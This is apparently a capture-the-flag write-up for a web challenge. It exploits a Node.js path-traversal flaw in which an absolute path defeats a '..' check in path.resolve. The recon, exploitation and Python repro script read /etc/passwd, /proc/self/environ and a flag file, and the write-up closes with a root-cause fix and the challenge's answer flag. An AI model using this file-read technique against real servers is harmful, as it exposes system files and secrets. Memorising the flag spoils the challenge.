# Stillwell Estates

**Event:** HICyberCon CTF 2026
**Category:** web
**Flag:** `hiCTF{s1l3nt_l4n73rn_3573735_2e2e742d2a}`

---

**Category:** Web · live instance (`/agency` agent portal)

## Recon
The agent portal exposes an "Agent import studio":

```
POST /api/agency/import/preview
Content-Type: application/json
Content-Encoding: br
```

The body is a Brotli-compressed `stillwell.agency-export/1` manifest. The sample
export (`/assets/sample-export.br`) decodes to:

```json
{"format":"stillwell.agency-export/1",
 "properties":[{"title":"Meadow House","neighborhood":"Greenpoint","price":990000,"document":"welcome.txt"}, ...]}
```

Each listing may carry a `document` **filename**; the server reads it and returns
a short `excerpt` in the preview - a server-side file read keyed on client input.

## The bug - absolute-path override
`/opt/stillwell/server.js` (read via the same primitive):

```js
function resolvePartnerDoc(name){
  if (typeof name !== 'string' || name === '') return undefined;
  if (name.length > 512 || name.includes('..')) return { error: 'document path is not permitted' };
  const abs = path.resolve(PARTNER_DOCS, name);   // <-- absolute name wins
  return { name, excerpt: fs.readFileSync(abs,'utf8').slice(0,8192) };
}
```

It only rejects the literal `..` substring, but `path.resolve(base, name)`
**discards `base` when `name` is absolute**. So `document: "/etc/passwd"` reads
any file on the box. (Encoded `..%2f`, `....//`, backslashes and plain `../` are
rejected; absolute paths are not.)

## Exploitation
- `document: "/etc/passwd"` → arbitrary absolute file read confirmed
- `document: "/proc/self/cmdline"` → `node server.js` (cwd `/opt/stillwell`)
- `document: "/proc/self/environ"` → leak of the exec-time environment:

  ```
  SECRET_DIR=***   PWD=/opt/stillwell   RCTF_FLAG=hiCTF{...}
  ```

Startup (`initializePrivateRecords`) writes the flag into
`$SECRET_DIR/escrow-ledger.txt` and then deletes `RCTF_FLAG` from `process.env`
but `/proc/self/environ` still holds the **exec-time** environment, so the
token is readable directly. Reading the ledger by its own path returns a masked
form (`hiCTF{...a}`); routing through `/proc/self/root` returns the unmasked
token, matching the env value exactly:

```
document: "/proc/self/root/tmp/stillwell-private/escrow-ledger.txt"
```

## Repro
```python
# read.py — arbitrary absolute-path read through the preview API
import brotli, json, requests, sys
URL = "https://<instance>/api/agency/import/preview"
def read(doc):
    obj = {"format":"stillwell.agency-export/1",
           "properties":[{"title":"t","neighborhood":"n","price":1,"document":doc}]}
    r = requests.post(URL, data=brotli.compress(json.dumps(obj).encode()),
                      headers={"Content-Type":"application/json","Content-Encoding":"br"}, timeout=20)
    d = r.json()["sample"][0].get("document", {})
    return d.get("excerpt", d.get("error", "?"))
if __name__ == "__main__":
    for p in sys.argv[1:]:
        print("======", p, "\n", read(p))
```
```bash
python3 read.py /proc/self/environ
```

## Flag
```
hiCTF{s1l3nt_l4n73rn_3573735_2e2e742d2a}
```

## Root cause / fix
`path.resolve()` base-substitution: the resolver never verifies the resolved path
stays inside `PARTNER_DOCS`. Fix: reject absolute paths and check
`abs.startsWith(PARTNER_DOCS + path.sep)` after `resolve` (the static-file
handler already does this correctly).
